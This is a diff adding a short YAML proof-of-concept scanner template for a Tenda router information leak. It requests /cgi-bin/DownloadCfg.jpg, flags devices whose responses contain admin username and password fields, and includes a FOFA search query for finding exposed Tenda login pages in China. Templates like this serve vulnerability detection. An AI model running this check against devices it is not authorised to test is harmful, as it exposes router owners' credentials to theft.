@@ -1,0 +1,24 @@
+id: poc-yaml-tenda-router-downloadcfg-jpg-info-leak
+info:
+  name: Tenda路由器 DownloadCfg.jpg 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Tenda 路由器
+  fofa: title=="Tenda | Login" && country="CN"
+requests:
+- method: GET
+  path: /cgi-bin/DownloadCfg.jpg
+  expression: 'status_code == 200 &&
+
+    contains(body,"http_username=") &&
+
+    contains(body,"http_passwd=") &&
+
+    contains(content_type,`config/conf`)
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
